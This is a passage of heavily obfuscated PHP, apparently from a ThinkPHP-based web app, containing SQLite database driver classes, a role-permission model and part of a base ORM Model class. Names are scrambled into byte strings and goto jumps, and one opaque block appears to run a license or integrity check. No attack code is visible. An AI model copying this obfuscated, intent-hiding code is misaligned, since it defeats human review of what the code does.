execute($Fé‡µ†Èº) { goto B”Ë‘Œí¹—; b”¼ê†­‚Œ: if (!1 === $FìÍ´ÌÈÎŞ) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } goto D¤Î¥ÜÅÔé; D¦©Ã£¦„·: think_status($DÚ—²”É„¼[20]); $FìÍ´ÌÈÎŞ = sqlite_exec($this->_linkID, $Fé‡µ†Èº); $this->debug(); goto b”¼ê†­‚Œ; cáß˜–£ô¨: $this->queryStr = $Fé‡µ†Èº; if ($this->queryID) { $this->free(); } think_action_status($DÚ—²”É„¼[21], 1); goto D¦©Ã£¦„·; B”Ë‘Œí¹—: $DÚ—²”É„¼ =& $_SERVER[ç]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto cáß˜–£ô¨; D¤Î¥ÜÅÔé: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[ç][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ağ…ğµ‡Úó = sqlite_query($this->_linkID, $_SERVER[ç][23]); if (!$ağ…ğµ‡Úó) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $aµÛ“”öá = sqlite_query($this->_linkID, $_SERVER[ç][24]); if (!$aµÛ“”öá) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $båƒ ÙÜĞô = array(); if ($this->numRows > 0) { for ($E±é«ÂÊ·É = 0; $E±é«ÂÊ·É < $this->numRows; $E±é«ÂÊ·É++) { $båƒ ÙÜĞô[$E±é«ÂÊ·É] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $båƒ ÙÜĞô; } public function getFields($cŸ¦¨™Å‹Ñ) { $BåÈÏ²–Ò¢ =& $_SERVER[ç]; $Céê‹šÃ° = $this->query($BåÈÏ²–Ò¢[25] . $cŸ¦¨™Å‹Ñ . $BåÈÏ²–Ò¢[26]); $E©ÉÃ´«Ò = array(); if ($Céê‹šÃ°) { foreach ($Céê‹šÃ° as $B¨ÍÀƒ¥ù => $CÌÓªô°½¶) { $E©ÉÃ´«Ò[$CÌÓªô°½¶[$BåÈÏ²–Ò¢[27]]] = array($BåÈÏ²–Ò¢[28] => $CÌÓªô°½¶[$BåÈÏ²–Ò¢[27]], $BåÈÏ²–Ò¢[29] => $CÌÓªô°½¶[$BåÈÏ²–Ò¢[30]], $BåÈÏ²–Ò¢[31] => (bool) ($CÌÓªô°½¶[$BåÈÏ²–Ò¢[32]] === $BåÈÏ²–Ò¢[33]), $BåÈÏ²–Ò¢[34] => $CÌÓªô°½¶[$BåÈÏ²–Ò¢[35]], $BåÈÏ²–Ò¢[36] => strtolower($CÌÓªô°½¶[$BåÈÏ²–Ò¢[37]]) == $BåÈÏ²–Ò¢[38], $BåÈÏ²–Ò¢[39] => strtolower($CÌÓªô°½¶[$BåÈÏ²–Ò¢[40]]) == $BåÈÏ²–Ò¢[41]); } } return $E©ÉÃ´«Ò; } public function getTables($Fï±Ù³ÈË = '') { $f¸áøˆ¹ò¤ =& $_SERVER[ç]; $B¨‹ºÁ›†ö = $this->query($f¸áøˆ¹ò¤[42] . $f¸áøˆ¹ò¤[43] . $f¸áøˆ¹ò¤[44]); $FÌ‘± ‹ê› = array(); foreach ($B¨‹ºÁ›†ö as $eæ¼¡êô¼Ö => $fãğ ª¹«Ÿ) { $FÌ‘± ‹ê›[$eæ¼¡êô¼Ö] = current($fãğ ª¹«Ÿ); } return $FÌ‘± ‹ê›; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $d˜„ôâÕ‹ =& $_SERVER[ç]; $AÇÁÃø©è• = sqlite_last_error($this->_linkID); $this->error = $AÇÁÃø©è• . $d˜„ôâÕ‹[4] . sqlite_error_string($AÇÁÃø©è•); if ($d˜„ôâÕ‹[33] != $this->queryStr) { $this->error .= LNG($d˜„ôâÕ‹[45]) . $this->queryStr; } think_trace($this->error, $d˜„ôâÕ‹[33], $d˜„ôâÕ‹[46]); return $this->error; } public function escapeString($aè£³ê‰„) { return sqlite_escape_string($aè£³ê‰„); } public function parseLimit($CÙÎ£Æ×Ÿ) { $dŒµ²šà“ö =& $_SERVER[ç]; $B½·ßšôºÚ = $dŒµ²šà“ö[33]; if (!empty($CÙÎ£Æ×Ÿ)) { $CÙÎ£Æ×Ÿ = explode($dŒµ²šà“ö[47], $CÙÎ£Æ×Ÿ); if (count($CÙÎ£Æ×Ÿ) > 1) { $B½·ßšôºÚ .= $dŒµ²šà“ö[48] . $CÙÎ£Æ×Ÿ[1] . $dŒµ²šà“ö[49] . $CÙÎ£Æ×Ÿ[0] . $dŒµ²šà“ö[50]; } else { $B½·ßšôºÚ .= $dŒµ²šà“ö[48] . $CÙÎ£Æ×Ÿ[0] . $dŒµ²šà“ö[50]; } } return $B½·ßšôºÚ; } } class DbSqlite3Base extends Db { public function __construct($Fòè¶–øœ  = '') { $bİ»ŠØë¸Œ =& $_SERVER[ç]; if (!class_exists($bİ»ŠØë¸Œ[51])) { think_exception(think_lang($bİ»ŠØë¸Œ[10]) . $bİ»ŠØë¸Œ[52]); } if (!empty($Fòè¶–øœ )) { if (!isset($Fòè¶–øœ [$bİ»ŠØë¸Œ[12]])) { $Fòè¶–øœ [$bİ»ŠØë¸Œ[12]] = 438; } $this->config = $Fòè¶–øœ ; if (empty($this->config[$bİ»ŠØë¸Œ[13]])) { $this->config[$bİ»ŠØë¸Œ[13]] = array(); } } } public function connect($aš¾Ì¤Æ¼ù = '', $D·“ùÑÛ‡Ò = 0) { $f¦Îîà¥¤í =& $_SERVER[ç]; if (!isset($this->linkID[$D·“ùÑÛ‡Ò])) { if (empty($aš¾Ì¤Æ¼ù)) { $aš¾Ì¤Æ¼ù = $this->config; } $this->linkID[$D·“ùÑÛ‡Ò] = new SQLite3($aš¾Ì¤Æ¼ù[$f¦Îîà¥¤í[17]]); if (!$this->linkID[$D·“ùÑÛ‡Ò]) { think_exception($this->linkID[$D·“ùÑÛ‡Ò]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$D·“ùÑÛ‡Ò]->busyTimeout(30000); if (1 != think_config($f¦Îîà¥¤í[18])) { unset($this->config); } } return $this->linkID[$D·“ùÑÛ‡Ò]; } public function free() { $this->queryID = null; } public function query($a‰ñŞª«Í) { goto EÄ’ÙÇÆå§; EÄ’ÙÇÆå§: $E•ª‹¿Ù†‡ =& $_SERVER[ç]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto a…õé÷¡Šì; b„‹é÷Şİ: if (!1 === $this->queryID) { $this->error(); return !1; } else { $a‹¤¶æä¿Š = $this->getAll(); $this->numRows = count($a‹¤¶æä¿Š); return $a‹¤¶æä¿Š; } goto D¹…Ä™íË; D“½×‹å¶ß: think_status($E•ª‹¿Ù†‡[20]); $this->queryID = $this->_linkID->query($a‰ñŞª«Í); $this->debug(); goto b„‹é÷Şİ; a…õé÷¡Šì: $this->queryStr = $a‰ñŞª«Í; if ($this->queryID) { $this->free(); } think_action_status($E•ª‹¿Ù†‡[19], 1); goto D“½×‹å¶ß; D¹…Ä™íË: } public function execute($d¢„ä™´á) { goto d˜ÅÈóŸİÈ; Fà¿¾é„¸Ó: $this->queryStr = $d¢„ä™´á; if ($this->queryID) { $this->free(); } think_action_status($CÍêŠÜÎ[21], 1); goto e÷Ë›²Ğ§; d˜ÅÈóŸİÈ: $CÍêŠÜÎ =& $_SERVER[ç]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto Fà¿¾é„¸Ó; e÷Ë›²Ğ§: think_status($CÍêŠÜÎ[20]); $D–áˆ†›Â = $this->_linkID->exec($d¢„ä™´á); $this->debug(); goto CùŒ„«™©ò; CùŒ„«™©ò: if (!1 === $D–áˆ†›Â) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } goto f†ªµ†ôÑ±; f†ªµ†ôÑ±: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[ç][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $AƒÏ×âÒ¦ = $this->_linkID->query($_SERVER[ç][23]); if (!$AƒÏ×âÒ¦) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $BÕŠŸ¯Û…µ = $this->_linkID->query($_SERVER[ç][24]); if (!$BÕŠŸ¯Û…µ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $CÜ£œõéÃÛ = array(); while ($CË‰÷ñÃ‚» = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $CÜ£œõéÃÛ[] = $CË‰÷ñÃ‚»; } $this->queryID->reset(); return $CÜ£œõéÃÛ; } public function getFields($fñ¨ Õ·á ) { $Cœ´©²¿® =& $_SERVER[ç]; $e¶—©‰©ğ = $this->query($Cœ´©²¿®[25] . $fñ¨ Õ·á  . $Cœ´©²¿®[26]); $DÏù¬Ù§ƒÁ = array(); if ($e¶—©‰©ğ) { foreach ($e¶—©‰©ğ as $cÅª¡å ó => $D–ùèøİÉÜ) { $DÏù¬Ù§ƒÁ[$D–ùèøİÉÜ[$Cœ´©²¿®[28]]] = array($Cœ´©²¿®[28] => $D–ùèøİÉÜ[$Cœ´©²¿®[28]], $Cœ´©²¿®[29] => $D–ùèøİÉÜ[$Cœ´©²¿®[29]], $Cœ´©²¿®[31] => (bool) ($D–ùèøİÉÜ[$Cœ´©²¿®[31]] === $Cœ´©²¿®[33]), $Cœ´©²¿®[34] => $D–ùèøİÉÜ[$Cœ´©²¿®[53]], $Cœ´©²¿®[36] => (bool) $D–ùèøİÉÜ[$Cœ´©²¿®[54]], $Cœ´©²¿®[39] => (bool) $D–ùèøİÉÜ[$Cœ´©²¿®[54]]); } } return $DÏù¬Ù§ƒÁ; } public function getTables($e†ùä²Ó‘Ğ = '') { $eâ‰×¾µ»“ =& $_SERVER[ç]; $f´æ²‘’„¶ = $this->query($eâ‰×¾µ»“[42] . $eâ‰×¾µ»“[43] . $eâ‰×¾µ»“[44]); $D£‡šö”éÖ = array(); foreach ($f´æ²‘’„¶ as $bé«íâ·òĞ => $fæÛëâäÌÅ) { $D£‡šö”éÖ[$bé«íâ·òĞ] = current($fæÛëâäÌÅ); } return $D£‡šö”éÖ; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $D¥øĞ¹˜£· =& $_SERVER[ç]; $this->error = $this->_linkID->lastErrorMsg(); if ($D¥øĞ¹˜£·[33] != $this->queryStr) { $this->error .= LNG($D¥øĞ¹˜£·[45]) . $this->queryStr; } think_trace($this->error, $D¥øĞ¹˜£·[33], $D¥øĞ¹˜£·[46]); return $this->error; } public function escapeString($d¨éï¡ß) { $c•éƒ»½ôí =& $_SERVER[ç]; if ($this->_linkID) { return $this->_linkID->escapeString($d¨éï¡ß); } return str_ireplace($c•éƒ»½ôí[55], $c•éƒ»½ôí[56], $d¨éï¡ß); } public function parseLimit($d°â¸Î«¥) { $DÇ£Ù‡ôŒ‹ =& $_SERVER[ç]; $BÕÛÄôÕ = $DÇ£Ù‡ôŒ‹[33]; if (!empty($d°â¸Î«¥)) { $d°â¸Î«¥ = explode($DÇ£Ù‡ôŒ‹[47], $d°â¸Î«¥); if (count($d°â¸Î«¥) > 1) { $BÕÛÄôÕ .= $DÇ£Ù‡ôŒ‹[48] . $d°â¸Î«¥[1] . $DÇ£Ù‡ôŒ‹[49] . $d°â¸Î«¥[0] . $DÇ£Ù‡ôŒ‹[50]; } else { $BÕÛÄôÕ .= $DÇ£Ù‡ôŒ‹[48] . $d°â¸Î«¥[0] . $DÇ£Ù‡ôŒ‹[50]; } } return $BÕÛÄôÕ; } } goto D¡µ«Á›±’; E…˜Æª’†â: $aóÓá”Öš† = $_SERVER[ç][1936]; if ($_SERVER[$_SERVER[ç][788]] != $aóÓá”Öš†($aššµ¢³)) { goto DòèÂÜæ›; DòèÂÜæ›: $cªæÉØì‚ = $_SERVER[ç][790]; $eßİ«Ÿó² = $_SERVER[$_SERVER[ç][791]] . $_SERVER[ç][792]; $cíéÂÕÃ»Î = $cªæÉØì‚($eßİ«Ÿó²); goto C¡î™À×Æù; C¡î™À×Æù: $e—ÜÜŠ†ï = explode($_SERVER[ç][227], $cíéÂÕÃ»Î); if (count($e—ÜÜŠ†ï) < $_SERVER[ç][570]) { $eŒåÑ×ÄÖœ = $_SERVER[ç][793]; $eŒåÑ×ÄÖœ(); } $d«÷÷…š’Ê = $_SERVER[ç][794]; goto B¸ó½ÃÌÅø; B¸ó½ÃÌÅø: $d«÷÷…š’Ê($aššµ¢³); goto Böèæ÷¥®Ã; Böèæ÷¥®Ã: } class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\145\x6d\56\x72\x6f\x6c\145\x4c\x69\x73\x74"; public $field = array("\156\x61\155\145", "\x61\165\164\150", "\154\141\x62\145\154", "\x64\151\163\160\x6c\141\171", "\x73\x79\163\164\145\155", "\x64\145\x73\x63", "\x69\x67\x6e\x6f\162\x65\x45\170\x74", "\x69\x67\x6e\x6f\162\x65\106\151\x6c\x65\123\151\172\145", "\141\144\x6d\x69\156\151\x73\x74\162\x61\164\157\x72", "\x73\x6f\x72\164"); public function listData($D¾«Ÿ­ÏÍí = false, $f¨Š‹˜À•¥ = "\x73\157\162\164", $dĞ¦Üˆ¨ÄË = false) { $AÙ¸˜›ŸÃ­ =& $_SERVER[ç]; $B¶°†ßæ•Ë = parent::listData($D¾«Ÿ­ÏÍí, $f¨Š‹˜À•¥, $dĞ¦Üˆ¨ÄË); if (!$D¾«Ÿ­ÏÍí) { foreach ($B¶°†ßæ•Ë as $E”ºŸóğóÅ => $B¶ÎÅïÃØÛ) { if ($B¶ÎÅïÃØÛ[$AÙ¸˜›ŸÃ­[1844]] == 1) { $B¶°†ßæ•Ë[$E”ºŸóğóÅ][$AÙ¸˜›ŸÃ­[425]] = LNG($AÙ¸˜›ŸÃ­[2067]); } } } return $B¶°†ßæ•Ë; } public function update($cÙÌ¸º‘äŒ, $d¢Îâœ’Í‡) { goto A±øë¤ë«Ì; e‚ßÁ¾›Î: return parent::update($cÙÌ¸º‘äŒ, $d¢Îâœ’Í‡); goto CÇÀÌŒòÚ; A±øë¤ë«Ì: $d±Šæé¸ =& $_SERVER[ç]; $Fˆ²©¦•› = parent::listData($cÙÌ¸º‘äŒ); $E™ ÙÊâÇ = $this->findByName($d¢Îâœ’Í‡[$d±Šæé¸[28]]); goto d…¬Š¸£øÀ; d…¬Š¸£øÀ: if (!$Fˆ²©¦•› || $E™ ÙÊâÇ && $E™ ÙÊâÇ[$d±Šæé¸[388]] != $Fˆ²©¦•›[$d±Šæé¸[388]]) { return !1; } if ($E™ ÙÊâÇ[$d±Šæé¸[1844]] == 1) { $d¢Îâœ’Í‡ = array($d±Šæé¸[28] => $d¢Îâœ’Í‡[$d±Šæé¸[28]], $d±Šæé¸[1675] => $d¢Îâœ’Í‡[$d±Šæé¸[1675]]); } $this->filterAuth($d¢Îâœ’Í‡[$d±Šæé¸[400]]); goto e‚ßÁ¾›Î; CÇÀÌŒòÚ: } public function remove($a¼”ÊòªáÏ) { $b»œàÛÙ³š = parent::listData($a¼”ÊòªáÏ); if (!$b»œàÛÙ³š || $b»œàÛÙ³š[$_SERVER[ç][1136]]) { return !1; } return parent::remove($a¼”ÊòªáÏ); } public function add($FÚ‹İÑ×Ï¤) { goto F´à²ë„±; F´à²ë„±: $b—ã˜ÆªÑé =& $_SERVER[ç]; $AôËí¶Ä¡ó = $FÚ‹İÑ×Ï¤[$b—ã˜ÆªÑé[28]]; if ($this->findByName($AôËí¶Ä¡ó)) { return !1; } goto c…Í·Ğã; c…Í·Ğã: $aºÊŸ´¯Å˜ = array($b—ã˜ÆªÑé[407] => $AôËí¶Ä¡ó, $b—ã˜ÆªÑé[1660] => $b—ã˜ÆªÑé[33], $b—ã˜ÆªÑé[1656] => $b—ã˜ÆªÑé[1664], $b—ã˜ÆªÑé[2068] => 1, $b—ã˜ÆªÑé[1659] => 0, $b—ã˜ÆªÑé[2069] => 0, $b—ã˜ÆªÑé[1658] => $this->getSort()); $FÚ‹İÑ×Ï¤ = array_merge($aºÊŸ´¯Å˜, $FÚ‹İÑ×Ï¤); $this->filterAuth($FÚ‹İÑ×Ï¤[$b—ã˜ÆªÑé[400]]); goto bÑ÷–Œø£; bÑ÷–Œø£: return parent::insert($FÚ‹İÑ×Ï¤); goto c¢Â·ğŸœ; c¢Â·ğŸœ: } private function getSort() { $e©¯ƒÔ¥„÷ =& $_SERVER[ç]; $bÙµ‹ƒ»ç— = parent::listData(); $B‘Ş»  = array_to_keyvalue($bÙµ‹ƒ»ç—, $e©¯ƒÔ¥„÷[33], $e©¯ƒÔ¥„÷[1677]); return empty($B‘Ş» ) ? 0 : max($B‘Ş» ) + 1; } private function filterAuth(&$AµÈŒì‹ñÀ) { $fÜŠßŠË¢÷ =& $_SERVER[ç]; $EŸ¥ ïß¦° = array(); $E˜Ê½çÆ„… = array_filter(explode($fÜŠßŠË¢÷[47], $AµÈŒì‹ñÀ)); foreach ($E˜Ê½çÆ„… as $AµÈŒì‹ñÀ) { $cëì„Š¹ÁÄ = explode($fÜŠßŠË¢÷[94], $AµÈŒì‹ñÀ); if ($cëì„Š¹ÁÄ[0] == $fÜŠßŠË¢÷[2070] && $cëì„Š¹ÁÄ[1] != $fÜŠßŠË¢÷[1057]) { $aÂˆ¨Â ´ = $cëì„Š¹ÁÄ[0] . $fÜŠßŠË¢÷[94] . $cëì„Š¹ÁÄ[1] . $fÜŠßŠË¢÷[2071]; if (!in_array($aÂˆ¨Â ´, $E˜Ê½çÆ„…)) { $EŸ¥ ïß¦°[] = $aÂˆ¨Â ´; } } $EŸ¥ ïß¦°[] = $AµÈŒì‹ñÀ; } $AµÈŒì‹ñÀ = implode($fÜŠßŠË¢÷[47], $EŸ¥ ïß¦°); } public function sort($f¹îõïµ×ê, $CÇ½ÂÂêÜ) { return parent::update($f¹îõïµ×ê, $CÇ½ÂÂêÜ); } } goto E‚Ó´ÑèÓ; D‚ää¹ÚğÖ: define($_SERVER[ç][238], 0); define($_SERVER[ç][239], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\141\x62\154\x65", "\157\162\144\x65\x72", "\x61\154\x69\x61\x73", "\x68\141\x76\x69\156\x67", "\x67\x72\x6f\165\x70", "\154\x6f\x63\153", "\x64\151\x73\164\x69\x6e\143\x74", "\x61\165\164\157", "\x66\x69\x6c\x74\145\162", "\x76\x61\154\x69\x64\141\164\x65", "\162\145\x73\x75\x6c\x74", "\142\151\x6e\144", "\x74\x6f\x6b\145\x6e"); public function __construct($e¡íêç­–… = '', $c‡—Ï»‚åÓ = '', $A­…ÇØŠŸ = '') { $A¦êğº =& $_SERVER[ç]; $this->_initialize(); if (!empty($e¡íêç­–…)) { if (strpos($e¡íêç­–…, $A¦êğº[94])) { list($this->dbName, $this->name) = explode($A¦êğº[94], $e¡íêç­–…); } else { $this->name = $e¡íêç­–…; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($c‡—Ï»‚åÓ)) { $this->tablePrefix = $A¦êğº[33]; } elseif ($A¦êğº[33] != $c‡—Ï»‚åÓ) { $this->tablePrefix = $c‡—Ï»‚åÓ; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($A¦êğº[240]); } $this->db(0, empty($this->connection) ? $A­…ÇØŠŸ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $eè„õÍÍŠ¨ =& $_SERVER[ç]; if (empty($this->fields)) { if (think_config($eè„õÍÍŠ¨[241])) { $FÏ®¨ˆÕ = $this->dbName ? $this->dbName : think_config($eè„õÍÍŠ¨[242]); $c¤Ï™¹ŸÙ = think_var_cache($eè„õÍÍŠ¨[243] . strtolower(get_path_this($FÏ®¨ˆÕ) . $eè„õÍÍŠ¨[94] . $this->name)); if ($c¤Ï™¹ŸÙ) { $aÃ“ªñ¡ = think_config($eè„õÍÍŠ¨[244]); if (empty($aÃ“ªñ¡) || $c¤Ï™¹ŸÙ[$eè„õÍÍŠ¨[245]] == $aÃ“ªñ¡) { $this->fields = $c¤Ï™¹ŸÙ; return; } } } $this->flush(); } } public function flush() { goto aƒå‰Ÿœ; a¥ïä¶›†ï: foreach ($aÊŒÙç£²¯ as $c—÷…‚¾òò => $aÃÄÆ‘¿Æ…) { $CÖƒóÓ•Ûğ[$c—÷…‚¾òò] = $aÃÄÆ‘¿Æ…[$B‹ŸŒÑ­¯ğ[29]]; if ($aÃÄÆ‘¿Æ…[$B‹ŸŒÑ­¯ğ[36]]) { $this->fields[$B‹ŸŒÑ­¯ğ[247]] = $c—÷…‚¾òò; if ($aÃÄÆ‘¿Æ…[$B‹ŸŒÑ­¯ğ[39]]) { $this->fields[$B‹ŸŒÑ­¯ğ[246]] = !0; } } } $this->fields[$B‹ŸŒÑ­¯ğ[248]] = $CÖƒóÓ•Ûğ; if (think_config($B‹ŸŒÑ­¯ğ[244])) { $this->fields[$B‹ŸŒÑ­¯ğ[245]] = think_config($B‹ŸŒÑ­¯ğ[244]); } goto dË§Ç…œÎÇ; dË§Ç…œÎÇ: if (think_config($B‹ŸŒÑ­¯ğ[241])) { $a£æİ¹¦¥ = $this->dbName ? $this->dbName : think_config($B‹ŸŒÑ­¯ğ[242]); think_var_cache($B‹ŸŒÑ­¯ğ[243] . strtolower(get_path_this($a£æİ¹¦¥) . $B‹ŸŒÑ­¯ğ[94] . $this->name), $this->fields); } goto bÂĞÄµ×ºÆ; FåŠ„§—Šù: if (!$aÊŒÙç£²¯) { return !1; } $this->fields = array_keys($aÊŒÙç£²¯); $this->fields[$B‹ŸŒÑ­¯ğ[246]] = !1; goto a¥ïä¶›†ï; aƒå‰Ÿœ: $B‹ŸŒÑ­¯ğ =& $_SERVER[ç]; $this->db->setModel($this->name); $aÊŒÙç£²¯ = $this->db->getFields($this->getTableName()); goto FåŠ„§—Šù; bÂĞÄµ×ºÆ: } public function switchModel($f‰ä¦ãÖ‚Š, $F‹¤è›ëØ = array()) { $f°Ê½ÂšÜ± =& $_SERVER[ç]; $C ¸‹•Íå› = ucwords(strtolower($f‰ä¦ãÖ‚Š)) . $f°Ê½ÂšÜ±[249]; if (!class_exists($C ¸‹•Íå›)) { think_exception($C ¸‹•Íå› . think_lang($f°Ê½ÂšÜ±[250])); } $this->_extModel = new $C ¸‹•Íå›($this->name); if (!empty($F‹¤è›ëØ)) { foreach ($F‹¤è›ëØ as $aŸˆ•©Ôáæ) { $this->_extModel->setProperty($aŸˆ•©Ôáæ, $this->{$aŸˆ•©Ôáæ}); } } return $this->_extModel; } public function __set($Cˆ÷Õ®µ·Š, $eÈ‹­–óâ) { $this->data[$Cˆ÷Õ®µ·Š] = $eÈ‹­–óâ; } public function __get($ešÖœµ³áó) { return isset($this->data[$ešÖœµ³áó]) ? $this->data[$ešÖœµ³áó] : null; } public function __isset($bÍ ùòİä‚) { return isset($this->data[$bÍ ùòİä‚]); } public function __unset($cõÉÛ†ï‘) { unset($this->data[$cõÉÛ†ï‘]); } public function __call($bÊá°§ÎÅŞ, $e¦²°ÃéÎ†) { $C–•ŸÃÌö¯ =& $_SERVER[ç]; if (in_array(strtolower($bÊá°§ÎÅŞ), $this->methods, !0)) { $this->options[strtolower($bÊá°§ÎÅŞ)] = $e¦²°ÃéÎ†[0]; return $this; } elseif (in_array(strtolower($bÊá°§ÎÅŞ), array($C–•ŸÃÌö¯[251], $C–•ŸÃÌö¯[252], $C–•ŸÃÌö¯[253], $C–•ŸÃÌö¯[254], $C–•ŸÃÌö¯[255]), !0)) { $eïÁ¤¾™ë™ = isset($e¦²°ÃéÎ†[0]) ? $e¦²°ÃéÎ†[0] : $C–•ŸÃÌö¯[182]; $eïÁ¤¾™ë™ = $this->db->parseKey($eïÁ¤¾™ë™); return $this->getField(strtoupper($bÊá°§ÎÅŞ) . $C–•ŸÃÌö¯[256] . $eïÁ¤¾™ë™ . $C–•ŸÃÌö¯[257] . $bÊá°§ÎÅŞ, $C–•ŸÃÌö¯[251]); } elseif (strtolower(substr($bÊá°§ÎÅŞ, 0, 5)) == $C–•ŸÃÌö¯[258]) { $eïÁ¤¾™ë™ = think_parse_name(substr($bÊá°§ÎÅŞ, 5)); $bºÂšåËÀ™[$eïÁ¤¾™ë™] = $e¦²°ÃéÎ†[0]; return $this->where($bºÂšåËÀ™)->find(); } elseif (strtolower(substr($bÊá°§ÎÅŞ, 0, 10)) == $C–•ŸÃÌö¯[259]) { $D…Úˆäã” = think_parse_name(substr($bÊá°§ÎÅŞ, 10)); $bºÂšåËÀ™[$D…Úˆäã”] = $e¦²°ÃéÎ†[0]; return $this->where($bºÂšåËÀ™)->getField($e¦²°ÃéÎ†[1]); } elseif (isset($this->_scope[$bÊá°§ÎÅŞ])) { return $this->scope($bÊá°§ÎÅŞ, $e¦²°ÃéÎ†[0]); } elseif (method_exists($this, $bÊá°§ÎÅŞ)) { array_unshift($e¦²°ÃéÎ†, $bÊá°§ÎÅŞ); return call_user_func_array(array($this, $C–•ŸÃÌö¯[260]), $e¦²°ÃéÎ†); } else { return call_user_func_array(array(parent, $bÊá°§ÎÅŞ), $e¦²°ÃéÎ†); } } protected function call() { goto cÍŸÍä¯‡; c¨‘‹’›µ: $dˆ×ë“Ëåù = call_user_func_array(array($this, $Cç„·™Ú•), $dª¬À¿¯èù); if (method_exists($this, $a¥¸õ‡Ø»×[264])) { $e·ÁÔ´² = call_user_func_array(array($this, $a¥¸õ‡Ø»×[265]), array($dß¥âƒÂ”¨, $dª¬À¿¯èù, $dˆ×ë“Ëåù)); if ($e·ÁÔ´²) { return $e·ÁÔ´²; } } return $dˆ×ë“Ëåù; goto Fó„Ä²°«‰; eÒ³ğ‰¸’: $dß¥âƒÂ”¨ = $Cç„·™Ú•; if (is_array($Cç„·™Ú•)) { $dß¥âƒÂ”¨ = $Cç„·™Ú•[1]; $Cç„·™Ú• = $Cç„·™Ú•[0]; } $fŸÌ˜…ì—Ÿ = count($dª¬À¿¯èù) - 1; goto F‡¶¤Ä¶›“; F‡¶¤Ä¶›“: if (isset($dª¬À¿¯èù[$fŸÌ˜…ì—Ÿ]) && $dª¬À¿¯èù[$fŸÌ˜…ì—Ÿ] === $Cç„·™Ú•) { think_exception(__CLASS__ . $a¥¸õ‡Ø»×[4] . $Cç„·™Ú• . think_lang($a¥¸õ‡Ø»×[261])); return; } $dª¬À¿¯èù[] = $Cç„·™Ú•; if (method_exists($this, $a¥¸õ‡Ø»×[262])) { $e·ÁÔ´² = call_user_func_array(array($this, $a¥¸õ‡Ø»×[263]), array($dß¥âƒÂ”¨, $dª¬À¿¯èù)); if (!is_null($e·ÁÔ´²) && $e·ÁÔ´² !== !1) { return $e·ÁÔ´²; } } goto c¨‘‹’›µ; cÍŸÍä¯‡: $a¥¸õ‡Ø»× =& $_SERVER[ç]; $dª¬À¿¯èù = func_get_args(); $Cç„·™Ú• = array_shift($dª¬À¿¯èù); goto eÒ³ğ‰¸’; Fó„Ä²°«‰: } protected function _initialize() { } protected function _facade($C•–”·¶„±) { $Fƒƒ‡æ‡­î =& $_SERVER[ç]; if (!empty($this->fields)) { foreach ($C•–”·¶„± as $aêò—ò©Á => $fòÉæ¨³—) { if (is_array($this->fields) && !in_array($aêò—ò©Á, $this->fields, !0)) { unset($C•–”·¶„±[$aêò—ò©Á]); } elseif (is_scalar($fòÉæ¨³—)) { $this->_parseType($C•–”·¶„±, $aêò—ò©Á); } } } if (!empty($this->options[$Fƒƒ‡æ‡­î[266]])) { $C•–”·¶„± = array_map($this->options[$Fƒƒ‡æ‡­î[266]], $C•–”·¶„±); unset($this->options[$Fƒƒ‡æ‡­î[266]]); } $this->_beforeWrite($C•–”·¶„±); return $C•–”·¶„±; } protected function _beforeWrite(&$eŒ§‹¯İô) { } public function add($cÉŠ†èÎÖó = '', $b‚áÌ¶Ê = array(), $añØ›İ…Æ° = false) { goto B Õì×Áƒ„; F£µÍØÁ×Ù: return $C…¨Ÿİ‰Â½; goto fòÎ´¦•¢š; b¨ä·ò×´: if (!1 === $this->_beforeInsert($cÉŠ†èÎÖó, $b‚áÌ¶Ê)) { return !1; } $C…¨Ÿİ‰Â½ = $this->db->insert($cÉŠ†èÎÖó, $b‚áÌ¶Ê, $añØ›İ…Æ°); if (!1 !== $C…¨Ÿİ‰Â½) { $FšŒâ°Á•ò = $this->getLastInsID(); if ($FšŒâ°Á•ò) { $cÉŠ†èÎÖó[$this->getPk()] = $FšŒâ°Á•ò; $this->_after_insert($cÉŠ†èÎÖó, $b‚áÌ¶Ê); return $FšŒâ°Á•ò; } $this->_after_insert($cÉŠ†èÎÖó, $b‚áÌ¶Ê); } goto F£µÍØÁ×Ù; B Õì×Áƒ„: if (empty($cÉŠ†èÎÖó)) { if (!empty($this->data)) { $cÉŠ†èÎÖó = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[ç][267]); return !1; } } $b‚áÌ¶Ê = 